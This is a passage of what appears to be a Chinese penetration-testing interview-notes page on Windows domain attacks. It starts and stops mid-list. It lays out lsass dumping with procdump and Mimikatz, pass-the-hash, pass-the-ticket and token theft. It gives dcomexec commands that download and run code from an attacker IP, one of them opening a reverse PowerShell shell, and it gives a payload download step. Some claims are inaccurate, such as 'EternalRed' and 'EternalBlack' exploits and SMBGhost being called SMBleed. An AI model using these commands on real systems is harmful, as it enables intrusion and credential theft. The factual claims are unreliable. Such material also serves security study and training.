<li>利用这个哈希值，通过 <strong>PsExec</strong>、<strong>WMI</strong> 或 <strong>SMBExec</strong> 等工具，在不输入密码的情况下登录 B 主机</li>
</ol>
<p><strong>常用工具：</strong></p>
<ul>
<li><strong>Mimikatz：</strong> 除了抓取哈希，Mimikatz 也能直接进行 PtH 攻击</li>
<li><strong>Metasploit 的 psexec_hash 模块</strong></li>
<li><strong>CrackMapExec</strong>：一个非常实用的渗透测试工具，可以批量对内网机器进行哈希传递攻击</li>
</ul>
<hr>
<h3 id="内网有杀软又怎么抓"><a href="#内网有杀软又怎么抓" class="headerlink" title="内网有杀软又怎么抓"></a>内网有杀软又怎么抓</h3><p><strong>1. 使用 Procdump 转储 lsass.exe 进程</strong></p>
<p><strong>Procdump</strong> 是微软 Sysinternals 工具集中的一个合法程序，它的主要功能是创建进程的内存转储文件（Memory Dump）。这个工具通常被系统管理员用来诊断程序崩溃</p>
<p>由于 Procdump 是一个合法的、微软签名的工具，很多杀毒软件默认将其视为可信程序，或者至少不会像对待 Mimikatz 那样立即拦截它对 <code>lsass.exe</code> 的访问</p>
<ul>
<li><strong>命令：</strong> <code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></li>
<li><strong>解释：</strong><ul>
<li><code>-accepteula</code>：接受许可协议，避免交互式提示</li>
<li><code>-ma</code>：指定转储整个内存</li>
<li><code>lsass.exe</code>：目标进程</li>
<li><code>lsass.dmp</code>：输出的转储文件名</li>
</ul>
</li>
</ul>
<p>执行这个命令后，它会创建一个包含 <code>lsass.exe</code> 进程内存数据的 <code>lsass.dmp</code> 文件，并将其保存在磁盘上。这一步的重点在于：<strong>没有使用任何恶意工具，只使用了系统管理员常用的合法工具</strong></p>
<p><strong>2. 将转储文件下载到攻击机</strong></p>
<p>这一步需要你将 <code>lsass.dmp</code> 文件从目标服务器下载到你的本地攻击机。你可以使用多种方法，例如：</p>
<ul>
<li><strong>HTTP&#x2F;HTTPS 文件传输：</strong> 在目标机器上通过 <code>powershell</code> 或其他工具，将文件上传到你搭建的 Web 服务器。</li>
<li><strong>SMB&#x2F;SFTP 传输：</strong> 如果网络环境允许，通过 SMB 共享或 SFTP 传输文件</li>
</ul>
<p>这个过程可能会被杀毒软件或网络安全设备检测到，因此需要注意。但即使被检测到，也只是一个数据传输行为，而不是一个恶意代码执行行为</p>
<p><strong>3. 使用 Mimikatz 离线读取转储文件</strong></p>
<p>当 <code>lsass.dmp</code> 文件下载到你的攻击机后，你就可以在你的本地机器上运行 Mimikatz，并让它去分析这个转储文件，而不是去连接目标机器的 <code>lsass.exe</code> 进程</p>
<ul>
<li><strong>命令：</strong><ul>
<li><code>mimikatz.exe</code></li>
<li><code>privilege::debug</code></li>
<li><code>sekurlsa::minidump lsass.dmp</code></li>
<li><code>sekurlsa::logonpasswords</code></li>
</ul>
</li>
<li><strong>解释：</strong><ul>
<li><code>privilege::debug</code>：获取调试权限，这是 Mimikatz 正常工作所必需的</li>
<li><code>sekurlsa::minidump lsass.dmp</code>：指定 Mimikatz 从 <code>lsass.dmp</code> 文件而不是实时进程中读取数据</li>
<li><code>sekurlsa::logonpasswords</code>：从加载的转储文件中提取登录凭据</li>
</ul>
</li>
</ul>
<hr>
<h3 id="操作系统什么版本之后抓不到密码"><a href="#操作系统什么版本之后抓不到密码" class="headerlink" title="操作系统什么版本之后抓不到密码"></a>操作系统什么版本之后抓不到密码</h3><p>从 <strong>Windows 8.1 &#x2F; Windows Server 2012 R2</strong> 开始，微软为了应对 Mimikatz 这类工具，引入了 <strong>Protected Process Light (PPL)</strong> 安全机制</p>
<ul>
<li><strong>PPL 机制：</strong> PPL 使得 <strong><code>lsass.exe</code></strong> 进程成为了一个“受保护的进程”，这大大限制了非受信任的进程对其内存的访问。这意味着，像 Mimikatz 这样的工具，即使以管理员权限运行，也无法直接注入或读取 <code>lsass.exe</code> 的内存来获取明文密码或哈希</li>
<li><strong>Credential Guard：</strong> 在 <strong>Windows 10 企业版</strong> 和 <strong>Windows Server 2016</strong> 及以上版本中，微软又引入了 <strong>Credential Guard</strong> 功能。它使用基于虚拟化的安全技术（VBS）来隔离 <code>lsass.exe</code>，进一步保护凭据。这意味着，即使攻击者获得了内核权限，也很难从 <code>lsass.exe</code> 进程中窃取凭据</li>
</ul>
<hr>
<h3 id="抓不到密码怎么绕过"><a href="#抓不到密码怎么绕过" class="headerlink" title="抓不到密码怎么绕过"></a>抓不到密码怎么绕过</h3><p><strong>1. 哈希传递</strong></p>
<p>这是在 Windows 环境下，当无法获取明文密码时的首选攻击方式。正如我们之前讨论的，Windows 在网络认证时可以直接使用用户的哈希值</p>
<ul>
<li><strong>执行方式：</strong> 使用 <strong>Mimikatz</strong>、<strong>PsExec</strong> 或者 <strong>CrackMapExec</strong> 这类工具，它们能够直接利用窃取的哈希值，在不知道明文密码的情况下，以该用户的身份登录到内网中的其他机器</li>
<li><strong>具体思路：</strong><ol>
<li>找到一种方法在目标机器上运行 Mimikatz 或类似工具。即使它无法获取明文密码，它通常也能抓取到用户的 <strong>NTLM 哈希</strong></li>
<li>将抓取到的哈希值复制到你的攻击机上</li>
<li>使用 <code>PsExec.exe \\目标IP -u 用户名 -h 哈希值 cmd.exe</code> 这样的命令，直接在目标机器上获得一个交互式 Shell</li>
</ol>
</li>
</ul>
<p>这个方法非常有效，因为即使是最新版本的 Windows，只要没有配置额外的安全措施（比如 Credential Guard），哈希传递攻击依然可行</p>
<p><strong>2. 票据传递</strong></p>
<p>这个技术是在 <strong>Kerberos</strong> 认证环境下使用的，更加高级和隐蔽</p>
<ul>
<li><strong>执行方式：</strong> 利用 Mimikatz 或其他工具，从内存中窃取用户的 <strong>Kerberos 票据（Ticket）</strong>，然后将这个票据注入到你的攻击机内存中</li>
<li><strong>具体思路：</strong><ol>
<li>在目标机器上获得一个域用户的会话</li>
<li>使用 Mimikatz 的 <code>sekurlsa::tickets /export</code> 命令，导出内存中的 Kerberos 票据</li>
<li>将导出的票据文件传送到你的攻击机</li>
<li>在你的攻击机上，使用 <code>kerberos::ptt</code> 命令，将票据注入到你的会话中</li>
<li>现在，你可以像票据的主人一样访问域内资源，而无需知道密码或哈希</li>
</ol>
</li>
</ul>
<p>这种方法的好处是，它不涉及密码或哈希的传输，更加难以被检测</p>
<hr>
<h3 id="桌面有管理员会话，怎么做会话劫持"><a href="#桌面有管理员会话，怎么做会话劫持" class="headerlink" title="桌面有管理员会话，怎么做会话劫持"></a>桌面有管理员会话，怎么做会话劫持</h3><p><strong>步骤一：获取 SYSTEM 权限</strong></p>
<p>要窃取管理员的令牌，你首先需要获得比该管理员会话更高的权限，通常是 <strong>SYSTEM 权限</strong></p>
<ul>
<li><strong>方法一：</strong> 如果你当前是以管理员权限运行的，可以尝试直接使用 Mimikatz 的 <code>token::elevate</code> 命令，它会尝试提升到 SYSTEM 权限</li>
<li><strong>方法二：</strong> 如果当前权限较低，可以通过提权漏洞（如服务权限配置错误、内核漏洞等）来提升到 SYSTEM 权限</li>
</ul>
<p><strong>步骤二：识别目标进程</strong></p>
<p>你需要找到一个由管理员账户启动的进程，该进程的令牌是你想要窃取的。通常，你可以通过 <code>tasklist /v</code> 命令来查看所有进程及其所属的用户</p>
<ul>
<li><strong>常用目标进程：</strong><ul>
<li><code>explorer.exe</code>：这是桌面进程，通常由当前登录的用户启动</li>
<li><code>winlogon.exe</code>：这是一个关键的系统进程，与用户会话和登录相关</li>
<li>其他由管理员账户启动的应用程序</li>
</ul>
</li>
</ul>
<p><strong>步骤三：窃取并冒用令牌</strong></p>
<p>一旦你有了 SYSTEM 权限，就可以使用 Mimikatz 来窃取令牌</p>
<ul>
<li><strong>命令：</strong><ol>
<li><code>mimikatz.exe</code></li>
<li><code>privilege::debug</code></li>
<li><code>token::elevate</code></li>
<li><code>whoami</code> （此时你应该看到你是 <code>NT AUTHORITY\SYSTEM</code>）</li>
<li><code>ts::session</code> （列出所有会话，找到管理员的会话 ID）</li>
<li><code>ts::s</code> + <code>&lt;会话ID&gt;</code> （切换到管理员的会话）</li>
<li><code>token::list</code> （列出当前会话的所有令牌，找到管理员的令牌）</li>
<li><code>token::impersonate /p:&lt;进程ID&gt;</code> （冒充管理员会话的某个进程的令牌）</li>
<li><code>whoami</code> （此时你应该看到你已经是管理员用户了）</li>
</ol>
</li>
</ul>
<p><strong>步骤四：执行命令</strong></p>
<p>当你成功冒充管理员身份后，你就可以执行任何管理员权限的命令，例如：</p>
<ul>
<li><code>shell powershell</code></li>
<li><code>shell cmd.exe</code></li>
<li>创建新的管理员账户</li>
<li>执行横向渗透命令（如 <code>PsExec</code>、<code>WMI</code>）</li>
</ul>
<hr>
<h3 id="当前机器上有一个密码本但被加密了，应该怎么办"><a href="#当前机器上有一个密码本但被加密了，应该怎么办" class="headerlink" title="当前机器上有一个密码本但被加密了，应该怎么办"></a>当前机器上有一个密码本但被加密了，应该怎么办</h3><p><strong>1. 识别加密算法和工具</strong></p>
<p>首先，你需要弄清楚这个密码本是用什么工具加密的，或者使用了哪种加密算法。这能帮你选择正确的破解方向和工具。</p>
<ul>
<li><strong>文件名或扩展名：</strong> 看看文件有没有特殊的扩展名，比如 <code>.rar</code>、<code>.7z</code>、<code>.zip</code> 等。如果是压缩文件，那破解思路就清晰多了</li>
<li><strong>文件头分析：</strong> 使用十六进制编辑器（如 <code>HxD</code> 或 <code>WinHex</code>）打开文件，检查文件头（前几个字节）。不同的文件格式，其文件头是不同的，这能给你一些线索</li>
<li><strong>关联进程或应用程序：</strong> 检查这台机器上是否安装了加密软件，比如 <code>VeraCrypt</code>、<code>7-Zip</code>、<code>WinRAR</code> 等。如果你能找到相关的加密工具，那破解会更容易</li>
</ul>
<p><strong>2. 尝试常见密码和弱口令</strong></p>
<p>这是最简单，但往往也是最有效的办法。很多人会使用简单、容易记住的密码</p>
<ul>
<li><strong>常见密码字典：</strong> 尝试一些常见的弱口令，比如 <code>123456</code>、<code>password</code>、<code>admin</code>、<code>qwerty</code> 等</li>
<li><strong>基于用户信息生成字典：</strong> 如果你对这台机器的用户有所了解，可以生成一个针对性的字典。比如，用户名、生日、公司名、项目名等</li>
</ul>
<p><strong>3. 利用破解工具</strong></p>
<p>一旦你确认了加密类型，就可以使用专门的破解工具进行暴力破解或字典攻击。</p>
<p><strong>压缩文件（RAR, ZIP, 7z）</strong></p>
<ul>
<li><strong>John the Ripper (JTR)：</strong> 一个强大的离线密码破解工具。它支持多种哈希类型和加密格式，可以用于破解加密的压缩文件</li>
<li><strong>Hashcat：</strong> 另一款非常流行的 GPU 加速密码破解工具。Hashcat 的速度比 JTR 快很多，特别适合面对复杂密码</li>
<li><strong>专用工具：</strong> 比如 <code>fcrackzip</code> 或 <code>7z2john</code>（JTR 自带），这些工具能把加密文件的哈希提取出来，然后用 JTR 或 Hashcat 进行离线破解</li>
</ul>
<p><strong>磁盘加密或容器（VeraCrypt, BitLocker）</strong></p>
<ul>
<li><strong>Mimikatz 的 <code>sekurlsa::dpapi</code>：</strong> 如果管理员会话还在，并且你拥有 SYSTEM 权限，可以尝试用 <code>mimikatz</code> 抓取 DPAPI 的主密钥。这个主密钥通常用于加密其他密钥，可能可以用来解密加密卷</li>
<li><strong>VeraCrypt 破解：</strong> 有一些开源工具可以配合 Hashcat 来破解 VeraCrypt 容器。但这个过程通常非常耗时，且需要强大的算力</li>
</ul>
<p><strong>4. 提取哈希并离线破解</strong></p>
<p>如果可能，你应该将密码本的哈希提取出来，然后带回到你的本地机器上进行离线破解。这样做有几个好处：</p>
<ul>
<li><strong>隐蔽性：</strong> 避免在目标机器上运行高强度的 CPU&#x2F;GPU 任务，从而减少被安全软件检测到的风险</li>
<li><strong>效率：</strong> 你可以使用自己的高性能硬件（如 GPU）来进行破解，速度会快很多</li>
</ul>
<p><strong>具体步骤：</strong></p>
<ol>
<li><strong>找到对应的哈希提取工具：</strong> 例如，<code>zip2john</code>、<code>rar2john</code> 或 <code>7z2john</code>。这些工具可以从加密文件中提取出哈希</li>
<li><strong>提取哈希：</strong> 在目标机器上运行这些工具，生成一个哈希文件</li>
<li><strong>下载哈希文件：</strong> 将这个小小的哈希文件传回你的本地机器</li>
<li><strong>本地破解：</strong> 在你的本地机器上，使用 <code>John the Ripper</code> 或 <code>Hashcat</code> 等工具，针对这个哈希进行字典攻击或暴力破解</li>
</ol>
<hr>
<h3 id="Dcom-怎么操作"><a href="#Dcom-怎么操作" class="headerlink" title="Dcom 怎么操作"></a>Dcom 怎么操作</h3><p><strong>利用 DCOM 执行命令</strong></p>
<p>这里我们主要介绍使用 <code>Impacket</code> 中的 <code>dcomexec.py</code> 工具，因为它非常灵活且功能强大</p>
<p><strong>基本语法：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt; <span class="string">&#x27;command&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<p>假设你拥有一个域用户 <code>testuser</code> 的密码 <code>Password123!</code>，目标机器 IP 是 <code>192.168.1.100</code>，你想执行 <code>whoami</code> 命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.py testdomain/testuser:Password123!@192.168.1.100 <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果成功，你会看到命令的输出</p>
<h3 id="利用-DCOM-获取交互式-Shell"><a href="#利用-DCOM-获取交互式-Shell" class="headerlink" title="利用 DCOM 获取交互式 Shell"></a>利用 DCOM 获取交互式 Shell</h3><p>仅仅执行单条命令是不够的，通常我们希望获得一个交互式的 Shell。<code>dcomexec.py</code> 同样可以做到</p>
<p><strong>示例：</strong></p>
<p>使用 <code>dcomexec.py</code> 启动一个反弹 Shell 的命令</p>
<ol>
<li><p><strong>监听端口：</strong> 在你的攻击机上，用 <code>netcat</code> 或其他工具监听一个端口，例如 4444</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>执行命令：</strong> 在目标机器上，利用 DCOM 执行一个 PowerShell 反弹 Shell 的命令。你需要将 <code>&lt;attacker_ip&gt;</code> 和 <code>&lt;port&gt;</code> 替换为你的实际 IP 和端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.py testdomain/testuser:Password123!@192.168.1.100 <span class="string">&quot;powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadString(&#x27;http://&lt;attacker_ip&gt;/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;attacker_ip&gt; -Port 4444&quot;</span></span><br></pre></td></tr></table></figure>

<p>或者使用更简单的 <code>certutil</code> 下载并执行恶意脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.py testdomain/testuser:Password123!@192.168.1.100 <span class="string">&quot;cmd.exe /c certutil.exe -urlcache -f http://&lt;attacker_ip&gt;/shell.bat &amp;&amp; shell.bat&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果成功，你的 <code>netcat</code> 监听器上会收到一个反弹回来的 Shell</p>
<hr>
<h3 id="获取域控的方法有哪些"><a href="#获取域控的方法有哪些" class="headerlink" title="获取域控的方法有哪些"></a>获取域控的方法有哪些</h3></li>
</ol>
<p><strong>1. 信息收集与利用</strong></p>
<p><strong>SYSVOL</strong></p>
<p>SYSVOL 是 Active Directory 中的一个共享文件夹，用于存储域内所有域控的公共文件，比如组策略（Group Policy）脚本。在渗透测试中，SYSVOL 是一个宝贵的信息源。攻击者可以通过访问 <code>\\&lt;domain_name&gt;\SYSVOL\&lt;domain_name&gt;\Policies</code> 路径，获取域内所有用户的组策略信息。这些文件中可能包含硬编码的密码、管理员账户信息或其他敏感配置，有时可以直接利用这些信息进行横向移动</p>
<p><strong>SPN 扫描</strong></p>
<p>SPN 是服务在 Kerberos 认证中的唯一标识。SPN 扫描（通常使用工具如 <code>setspn -T &lt;domain&gt; -q */*</code> 或 PowerView）可以发现域内所有注册了 SPN 的服务。许多服务（如 SQL Server、IIS 等）会使用域服务账户运行。如果这些服务账户的密码较弱，攻击者可以通过 Kerberoasting 攻击，请求这些服务的 TGS 票据，然后离线破解票据中的哈希，从而获取服务账户的明文密码</p>
<p><strong>2. 凭证窃取与传递</strong></p>
<p><strong>凭证窃取</strong></p>
<p>这是渗透测试中的核心技术。除了之前提到的 Mimikatz 和 LSASS 转储，还有其他多种方式：</p>
<ul>
<li><strong>注册表和文件窃取：</strong> 许多应用程序会在注册表或文件中存储凭据</li>
<li><strong>浏览器凭据：</strong> 窃取浏览器中保存的密码</li>
</ul>
<p><strong>黄金票据与白银票据</strong></p>
<p>这是 Kerberos 认证体系中的两种强大攻击方式，能让攻击者在域内获得几乎无限的权限</p>
<ul>
<li><strong>黄金票据 (Golden Ticket):</strong> 利用域内 KDC 服务的哈希（通常是 <code>krbtgt</code> 账户的哈希），伪造一个任意用户的 Kerberos TGT 票据。这个票据可以让我们在整个域内伪装成任何用户（通常是域管理员），访问任何服务。只要 <code>krbtgt</code> 账户的哈希没有改变，这个票据就是“永恒”的，可以持久化控制整个域</li>
<li><strong>白银票据 (Silver Ticket):</strong> 利用特定服务账户的哈希（如 <code>CIFS</code> 或 <code>MSSQLSvc</code>），伪造一个特定服务的 Kerberos TGS 票据。这个票据只能用于访问该特定服务，权限相对受限，但同样非常强大</li>
</ul>
<p><strong>哈希传递攻击和 NTLM Relay</strong></p>
<ul>
<li><strong>NTLM Relay:</strong> 攻击者在域内中间人攻击中，截获用户的 NTLM 认证请求，并将其转发到另一个服务（如 SMB、LDAP、HTTP 等），从而以受害用户的身份在该服务上执行操作。如果被中继的用户是域管理员，攻击者可以在没有明文密码的情况下，以域管理员的身份在目标机器上创建新的账户或执行其他恶意操作</li>
</ul>
<p><strong>3. 特殊漏洞利用与攻击链</strong></p>
<p><strong>Kerberos 委派</strong></p>
<p>Kerberos 委派允许一个服务以用户的身份去访问另一个服务。如果配置不当，攻击者可以利用非约束性委派或约束性委派中的漏洞，在特定条件下实现权限提升和横向移动。例如，如果一个服务配置了非约束性委派，攻击者可以劫持该服务，等待域管理员访问，从而获取其 TGT 票据，实现权限提升</p>
<p><strong>MS14-068 (Kerberos 漏洞)</strong></p>
<p>这是一个古老的但经典的 Kerberos 漏洞。攻击者可以利用该漏洞在未打补丁的域内普通主机上，伪造一个有效的 Kerberos 票据，并利用这个票据来提升权限，最终以域管理员身份获取域控权限。尽管现在大多数系统都已打补丁，但了解其原理对渗透测试仍然有价值</p>
<p><strong>Zerologon 漏洞 (CVE-2020-1472)</strong></p>
<p>这是一个非常严重的漏洞。它允许攻击者在未认证的情况下，通过 Netlogon 协议将域控的机器账户密码重置为空。一旦密码被重置，攻击者就可以以该账户（例如 <code>DC01$</code>）的身份完全接管域控。在渗透测试中，这是最直接和高效的获取域控权限的方法之一</p>
<p><strong>CVE-2021-42278 和 CVE-2021-42287</strong></p>
<p>这是两个密切相关的 Kerberos 漏洞，通常被称为“<strong>SAMAccountName 欺骗攻击</strong>”</p>
<ul>
<li><strong>CVE-2021-42278:</strong> 允许攻击者通过修改一个非域控计算机账户的 <code>sAMAccountName</code> 属性，将其伪装成域控</li>
<li><strong>CVE-2021-42287:</strong> 结合前一个漏洞，当域内服务发现一个机器账户的 <code>sAMAccountName</code> 属性与域控名称一致时，它会为该账户请求一个 TGT 票据。攻击者利用这个 TGT 票据，可以冒充域控，进一步获取 krbtgt 账户的哈希，最终实现黄金票据攻击</li>
</ul>
<hr>
<h3 id="DLL-劫持原理"><a href="#DLL-劫持原理" class="headerlink" title="DLL 劫持原理"></a>DLL 劫持原理</h3><p>Windows 系统在加载一个程序所需的 DLL 文件时，会遵循一个固定的搜索路径。这个路径通常包括：</p>
<ol>
<li><strong>程序所在目录</strong>：这是优先级最高的。系统会首先在可执行文件所在的文件夹内查找所需的 DLL。</li>
<li><strong>系统目录</strong>：如 <code>C:\Windows\System32</code>。</li>
<li><strong>16 位系统目录</strong>：<code>C:\Windows\System</code>。</li>
<li><strong>Windows 目录</strong>：<code>C:\Windows</code>。</li>
<li><strong>当前工作目录</strong>：程序启动时所在的目录。</li>
<li><strong>环境变量 <code>PATH</code> 中指定的目录</strong>。</li>
</ol>
<p><strong>DLL 劫持</strong>正是利用了第一条规则。很多软件在编程时，并没有指定所需 DLL 的绝对路径，而是依赖于系统的默认搜索顺序。如果攻击者知道某个程序需要加载一个名为 <code>abc.dll</code> 的文件，他们就可以制作一个同名的恶意 DLL，并将其放置在程序所在的文件夹中。当用户双击运行这个程序时，系统会优先加载这个恶意的 <code>abc.dll</code>，而不是位于系统目录中的合法 DLL</p>
<hr>
<h3 id="DPAPI-机制能干嘛"><a href="#DPAPI-机制能干嘛" class="headerlink" title="DPAPI 机制能干嘛"></a>DPAPI 机制能干嘛</h3><p>DPAPI 最大的特点是，它将加密数据和加密密钥都存储在本地。这意味着，只要我们能够以<strong>目标用户的身份</strong>登录系统，或者能够获取到该用户的<strong>主密钥</strong>（Master Key），我们就能解密所有被 DPAPI 加密的数据</p>
<p>而这个“主密钥”通常是和用户的登录密码哈希相关联的。一旦我们通过各种手段（如内存转储、LSASS 进程攻击）获取了用户的凭证哈希，我们就可以利用专门的工具来解密主密钥，进而解密所有 DPAPI 加密的数据</p>
<hr>
<h3 id="与-SMB-协议相关的漏洞有哪些"><a href="#与-SMB-协议相关的漏洞有哪些" class="headerlink" title="与 SMB 协议相关的漏洞有哪些"></a>与 SMB 协议相关的漏洞有哪些</h3><p><strong>1. 永恒之蓝</strong></p>
<p>这是最著名的 SMB 漏洞，没有之一。它利用了 <strong>SMBv1</strong> 协议中的一个远程代码执行漏洞（<strong>CVE-2017-0144</strong>）</p>
<ul>
<li><strong>漏洞原理：</strong> 攻击者通过向目标主机发送特制的数据包，利用 SMBv1 协议中处理内核模式下数据包的方式中的一个缓冲区溢出漏洞。一旦利用成功，攻击者便可以在目标主机上以系统权限远程执行代码</li>
</ul>
<p><strong>2. 永恒之蓝的变种与相关漏洞</strong></p>
<p>永恒之蓝并非单一漏洞，而是与一系列相关漏洞紧密相连的武器库的一部分，其中一些同样非常危险</p>
<ul>
<li><strong>永恒之红（EternalRed）：</strong> 利用 SMBv1 协议中的另一个漏洞（<strong>CVE-2017-0143</strong>），用于侦测目标主机是否可被利用</li>
<li><strong>永恒之黑（EternalBlack）：</strong> 同样是 SMBv1 协议的漏洞，用于窃取目标主机的哈希密码</li>
</ul>
<p>这些漏洞通常与永恒之蓝协同工作，构成一个完整的攻击链，用于信息收集和代码执行</p>
<p><strong>3. SMBGhost（SMBv3中的远程代码执行）</strong></p>
<p>SMBGhost（又称 <strong>SMBleed</strong>）是针对较新版本 SMB 协议（<strong>SMBv3.1.1</strong>）的漏洞</p>
<ul>
<li><strong>漏洞编号：</strong> <strong>CVE-2020-0796</strong></li>
<li><strong>漏洞原理：</strong> 该漏洞是由于SMBv3协议处理压缩数据的方式存在一个整数溢出，导致内核模式下的远程代码执行。这个漏洞的危险之处在于它<strong>无需身份验证</strong>，只要目标主机的 445 端口开放，攻击者就可以直接利用</li>
</ul>
<p><strong>4. SMB中继攻击</strong></p>
<p>SMB 中继攻击不是一个具体的代码漏洞，而是一种利用 SMB 协议设计缺陷的<strong>逻辑漏洞</strong></p>
<ul>
<li><strong>漏洞原理：</strong> 当一个用户尝试访问攻击者控制的 SMB 服务器时，攻击者可以捕获用户的 SMB 认证请求，并将其“中继”到另一个目标服务器。由于 SMBv2&#x2F;v3 使用 NTLMv2 认证，攻击者可以不破解密码，而是直接利用用户的凭证哈希在目标服务器上进行身份验证</li>
<li><strong>影响：</strong> 攻击者可以绕过密码，以受害者的身份访问其他服务器，通常用于内网横向移动</li>
<li><strong>防范：</strong> 主要的防御措施是启用 <strong>SMB 签名</strong>。SMB 签名可以验证 SMB 数据包的完整性和来源，从而防止中继攻击</li>
</ul>
<p><strong>5. SMB1 远程代码执行（CVE-2017-0147）</strong></p>
<p>这是一个在 SMBv1 中处理特殊数据包时存在的另一个漏洞，与永恒之蓝密切相关</p>
<ul>
<li><strong>漏洞编号：</strong> <strong>CVE-2017-0147</strong></li>
<li><strong>漏洞原理：</strong> 这是一个在 <code>Srvnet.sys</code> 驱动程序中处理 SMB 报文时存在的漏洞，攻击者可以发送一个恶意的 SMB请求来触发内核崩溃，从而导致远程代码执行</li>
</ul>
<hr>
<h3 id="MS14-068-原理"><a href="#MS14-068-原理" class="headerlink" title="MS14-068 原理"></a>MS14-068 原理</h3><p><strong>1. MS14-068 漏洞的本质</strong></p>
<p>这个漏洞发生在域控制器（Domain Controller）处理 Kerberos TGT 请求的环节。它的根源是 <strong>Kerberos 的一个签名验证绕过漏洞</strong></p>
<p>在一个正常的 Kerberos 认证流程中：</p>
<ol>
<li>用户使用自己的凭证（密码哈希）向域控制器请求 TGT</li>
<li>域控制器验证用户的凭证，并生成一个 TGT。这个 TGT 内部包含了用户的身份信息、权限组等数据，并且会用<strong>域控制器自身的密钥</strong>进行签名，以确保其完整性</li>
<li>用户拿到 TGT 后，可以用它向域控制器请求其他服务的票据，从而访问域内资源</li>
</ol>
<p>而 MS14-068 的漏洞就出在第2步：<strong>域控制器对 TGT 签名的验证逻辑存在缺陷</strong></p>
<p><strong>2. 详细原理：利用过程</strong></p>
<p>MS14-068 的攻击利用过程可以分解为以下几个关键步骤：</p>
<ul>
<li><strong>步骤一：收集信息</strong> 攻击者需要一个<strong>普通域用户账户</strong>的凭证（用户名、密码哈希或 AES 密钥）。这个账户不需要任何特殊权限。同时，攻击者还需要知道域控制器的<strong>域 SID</strong></li>
<li><strong>步骤二：伪造 SID（SID Splicing）</strong> 这是攻击的核心。攻击者在本地伪造一个身份信息，其中包含了普通用户的 SID，但同时还偷偷插入了一个<strong>伪造的域管理员组 SID</strong>（通常是 <code>S-1-5-21-XXX-519</code>，也就是 <code>Domain Admins</code> 的组 SID）</li>
<li><strong>步骤三：绕过签名验证</strong> 攻击者将伪造的身份信息打包成一个伪造的 Kerberos 请求。由于域控制器的签名验证机制存在缺陷，它不会正确地校验票据的完整性。当它收到这个请求时，它会<strong>错误地认为</strong>这个请求是合法的</li>
<li><strong>步骤四：生成高权限 TGT</strong> 域控制器被成功欺骗，它会根据伪造的请求，生成一个<strong>错误的 TGT</strong>。这个 TGT 包含的权限信息是伪造的，即它会<strong>错误地授予用户域管理员组的权限</strong>。最重要的是，这个错误的 TGT 会被用<strong>域控制器自身的密钥</strong>签名</li>
<li><strong>步骤五：权限提升</strong> 攻击者拿到这个被域控制器“官方认证”的、拥有域管理员权限的 TGT 后，就可以用它<strong>自由地访问域内任何资源</strong>。这个伪造的 TGT 和真正的域管理员的 TGT 没有任何区别</li>
</ul>
<hr>
<h3 id="内网文件-exe-落地怎么去做，用什么命令去执行来落地"><a href="#内网文件-exe-落地怎么去做，用什么命令去执行来落地" class="headerlink" title="内网文件 exe 落地怎么去做，用什么命令去执行来落地"></a>内网文件 exe 落地怎么去做，用什么命令去执行来落地</h3><p><strong>1. 文件落地前的准备</strong></p>
<p>在执行文件落地之前，你需要做好以下准备工作：</p>
<ul>
<li><strong>选择合适的工具</strong>：你需要一个轻量、隐蔽、功能强大的工具，例如 <strong><code>meterpreter</code></strong>，它支持直接在内存中执行 Shellcode，避免文件落地。如果你必须落地文件，可以选择用 C++ 或 Go 等语言编写的、没有明显恶意特征的自定义 Payload</li>
<li><strong>设置文件服务器</strong>：在你的攻击机上，你需要搭建一个简单的 Web 服务器或 SMB 服务器，以便目标机器能够下载文件<ul>
<li><strong>HTTP 服务器</strong>：在 Python 中，你可以用一行命令快速启动一个 HTTP 服务器：<code>python3 -m http.server 80</code></li>
<li><strong>SMB 服务器</strong>：使用 <strong><code>Impacket</code></strong> 工具包中的 <strong><code>smbserver.py</code></strong> 脚本，可以搭建一个 SMB 服务器</li>
</ul>
</li>
</ul>
<p><strong>2. 内网文件落地常用命令</strong></p>
<p>一旦你获得了目标机器的权限，就可以使用以下命令来下载文件：</p>
<p><strong>方法一：使用 PowerShell （推荐）</strong></p>
<p>PowerShell 是现代 Windows 系统自带的强大脚本语言，也是渗透测试中最常用的文件落地工具</p>
<ul>
<li><p><strong>使用 <code>Invoke-WebRequest</code> 或 <code>iwr</code></strong> 这是最常用的方法，它可以在后台下载文件，并且功能强大</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载文件并保存到指定路径</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://&lt;攻击机IP&gt;/payload.exe <span class="literal">-OutFile</span> C:\Users\Public\payload.exe</span><br><span class="line"><span class="comment"># 或者使用别名</span></span><br><span class="line"><span class="built_in">iwr</span> http://&lt;攻击机IP&gt;/payload.exe <span class="literal">-OutFile</span> C:\Users\Public\payload.exe</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 <code>.NET</code> 对象</strong> 这种方法更隐蔽，因为它直接调用 .NET 库，而不是通过一个特定的 cmdlet</p>
